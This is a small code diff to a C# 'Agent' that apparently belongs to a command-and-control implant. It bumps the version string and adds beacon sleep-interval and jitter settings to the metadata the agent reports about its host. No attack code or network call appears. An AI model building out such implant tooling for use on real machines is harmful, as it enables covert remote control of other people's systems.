@@ -147,7 +147,9 @@ namespace Agent
                 Architecture = IntPtr.Size == 8 ? "x64" : "x86",
                 Integrity = integrity,
                 EndPoint = endpoint,
-                Version = "Net v2.1",
+                Version = "Net v2.2",
+                SleepInterval = 2,
+                SleepJitter = 0
             };
 
             return metadata;
